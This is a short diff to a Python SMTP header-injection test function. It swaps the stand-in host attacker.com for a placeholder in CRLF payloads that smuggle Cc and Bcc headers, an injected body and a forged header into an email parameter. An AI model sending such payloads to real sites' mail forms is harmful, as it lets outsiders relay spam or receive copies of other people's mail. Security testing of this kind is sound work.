@@ -477,8 +477,8 @@ def estimate_attack_window(domain):
 def test_smtp_injection(endpoint_url, param_name):
     """测试 SMTP 头注入"""
     payloads = [
-        f"test@a.com\r\nCc: injected@attacker.com",
-        f"test@a.com\nBcc: injected@attacker.com",
+        f"test@a.com\r\nCc: injected@<attacker-domain>",
+        f"test@a.com\nBcc: injected@<attacker-domain>",
         f"test@a.com\r\n\r\nInjected body",
         f'"test@a.com" <test@a.com>\r\nX-Attacker: true',
     ]
